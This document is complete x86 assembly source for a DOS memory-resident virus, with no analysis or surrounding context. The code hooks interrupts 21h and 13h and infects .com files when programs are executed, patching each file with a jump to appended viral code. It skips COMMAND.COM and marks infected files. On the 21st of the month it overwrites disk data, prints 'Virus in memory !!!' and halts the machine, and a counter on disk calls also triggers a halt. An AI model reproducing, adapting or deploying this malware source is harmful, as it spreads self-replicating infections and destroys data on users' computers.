start:  jmp     short begin
	db	(00h)
	db	(53h)
	db	(4bh)
	int	20h
okey:	db	(0b8h)
	db	(03h)
	db	(00h)
	db	(0cdh)
	db	(10h)
begin:	push	cx
	CALL	F1
F1:	POP	SI
	SUB	SI,09
	PUSH	SI
        cld
	mov	di,100h
	mov	cx,5
	rep	movsb
	jmp	ding2
int21h: STI
	cmp	ah,4bh
	jz	mm
        jmp     int1hh
mm:	pushf
        PUSH    AX
	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	DS
	PUSH	ES
	PUSH	SI
	PUSH	DI
	mov	byte ptr [virusw],1
        mov     ah,2ah
	int	21h
	cmp	dl,21
	jnz	et3
	mov	ax,0309h
	mov	dx,0000h
	mov	cx,0001h
	lea	bx,[100h]
	int	13h
	mov	ah,9
	mov	dx,offset name
	int	21h
	cli
	hlt
dinge:	jmp	ding
et3:	push	cs		;ds <- cs
	pop	ds
	mov	ah,2fh		;Dos service function ah=2FH (get DTA)
	int	21h		;ES:BX Addres of current DTA
	mov	[edta],ES
	mov	[bdta],BX
	mov	ah,1ah		;Dos service function ah=1AH (set DTA)
	mov	dx,offset end+7 ;DS:DX Addres of DTA
	int	21h
	push	cs
	pop	ds
        MOV     AH,4eH
        MOV     DX,offset files
	mov	cx,00
        INT     21H             ;Dos service function ah=4EH (FIND FIRST)
        jc      dinge           ;CX  File attribute
                                ;DS:DX Pointer of filespec (ASCIIZ string)
vir:	mov	ax,3d02h
	push	cs
	pop	ds
	mov	dx,offset end+7 ;DS:DX Addres of DTA
	add	dx,1EH
	int	21h		;Dos service function ah=3DH (OPEN FILE)
                                ;AL Open mode
                                ;DS:DX Pointer to filename (ASCIIZ string)
                                ;Return AX file handle
        mov     [handle],ax
	mov	ah,'C'
	mov	al,'D'
        PUSH    DX
        POP     BX
	cmp	[bx],ah ;Compare filename for 'COMMAND.COM'
	jnz	p1		;If not first char 'C' then push virus in file
	cmp	[bx+6],al
	jz	v		;If 7 char 'D' then find next file
p1:     mov     bx,handle
        push    cs
	pop	ds
	mov	ah,3fh
	mov	dx,offset end
	mov	cx,5
	int	21h		;Dos service function ah=3FH (READ FILE)
                                ;BX File handle
                                ;CX Number of bytes to read
                                ;DS:DX Addres of buffer
	push	cs
	pop	es		;ES <- CS
	cld
        PUSH    DX
        POP     SI
	mov	di,offset okey
	mov	cx,5
	rep	movsb		;Repeat While CX>0 do ES:DI <- DS:SI
                                ;                     SI=SI+1
                                ;                     DI=DI+1
	mov	ax,534bh
	mov	di,dx
	add	di,3
	cmp	[di],ah
	jnz	fuck
	inc	di
	cmp	[di],al
	jnz	fuck
v:	push	cs
	pop	ds
	mov	bx,handle
	mov	ah,3eh
	int	21h
	push	cs
	pop	ds
	mov	ah,4fh
	int	21h
	jc	enzi
	jmp	short vir
enzi:	jmp	ding
fuck:   mov     ax,offset end+7
	add	ax,1aH
	mov	di,ax
        Mov     Word Ptr cx,[di]
        mov     ax,offset end
	mov	di,ax
	mov	al,0e9h
	cmp	cx,1a0h
	jna	v
	add	cx,2
	mov	[di],al
	inc	di
	mov	Word Ptr [di],cx
	mov	ax,534bh
	add	di,2
	mov	[di],ah
	inc	di
	mov	[di],al
        mov     bx,[handle]    ;
	mov	ax,4200h
	xor	cx,cx
	xor	dx,dx
	push	cs
	pop	ds
	int	21h
	mov	bx,handle
	mov	ah,40h
	mov	dx,offset end
	mov	cx,5
	int	21h
	mov	ax,4202h
	xor	cx,cx
	xor	dx,dx
	int	21h
	push	cs
	pop	ds
	mov	bx,handle
	mov	ah,40h
	mov	dx,offset okey
	mov	cx,end-okey
	int	21h
	mov	bx,handle
        mov     ah,3eh
	int	21h
	inc	Word ptr [save]
ding:	push	cs
	pop	ds
	mov	ah,1ah
	mov	ds,[edta]
	mov	dx,[bdta]
	int	21h
	mov	byte ptr [virusw],0
        POP     DI
	POP	SI
        POP     ES
	POP	DS
	POP	DX
	POP	CX
	POP	BX
	POP	AX
	popf
int1hh	nop
int1h:  db      (0eah)
is:	dw	0
io:	dw	0
int13h: cli
	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	DS
	PUSH	ES
	PUSH	SI
	PUSH	DI
	inc	Word ptr [save]
	cmp	Word ptr [save],1000h
	jnz	etk3
	cli
	hlt
etk3:	STI
        int     65h
	push	ax
	mov	ax,0
	mov	ds,ax
	cmp	byte ptr [virusw],0
	pop	ax
	jz	etk5
        clc
	mov	ax,0
etk5:   POP     DI
	POP	SI
        POP     ES
	POP	DS
	POP	DX
	POP	CX
	POP	BX
	db	(0CAH)
	db	(02)
	db	(00)
name:	db	'Virus in memory !!! $'
for1:	jmp	ding1
files:	db	'*.com',0
ding2:	mov	ax,0000h
	mov	ds,ax
        MOV     BX,300H
	MOV	CX,4b53h
	cmp	[bx],cx
	jz	for1
        mov     [bx],cx
        mov     ah,62h
	int	21h
	mov	ds,bx
	mov	bx,[2ch]
	dec	bx
	mov	dx,0FFFFh
loc_1:	mov	ds,bx
	mov	di,[3]
	inc	di
	add	dx,di
	add	bx,di
	cmp	byte ptr [0000],5Ah
	jne	loc_1
	mov	cx,es
	add	cx,dx
	sub	word ptr [3],80h
	sub	cx,80h
	sub	cx,10h
	mov	es,cx
	mov	di,100h
	cld
        mov     ax,0000h
        mov     ds,ax
        mov     bx,[004ch]
        mov     [0194h],bx
        mov     cx,[004eh]
        mov     [0196h],cx
	MOV	BX,[0084H]
	MOV	CX,[0086H]
	push	cs
	pop	ds
	POP	SI
	PUSH	SI
	ADD	SI,IS-OKEY
	MOV	[SI],BX
	MOV	[SI+2],CX
	POP	SI
	PUSH	SI
	sub	si,7
	mov	di,100h
	mov	cx,800h
	rep	movsb
	mov	ax,0000
	mov	ds,ax
	cli
	mov	WORD PTR [0086h],ES
        mov     WORD PTR [004eh],ES
	mov	di,int13h-okey
	add	di,107h
        mov     WORD PTR [004ch],di
	mov	di,int21h-okey
	add	di,107h
	mov	WORD PTR [0084h],di
ding1:	POP	SI
	sti
	PUSH	CS
	POP	DS
	POP	CX
	mov	si,100h
	jmp	si
handle: dw	?
edta:	dw	?
bdta:	dw	?
VIRUSW: DB	(00)
SAVE:	DB	(00)
end:    db      (00)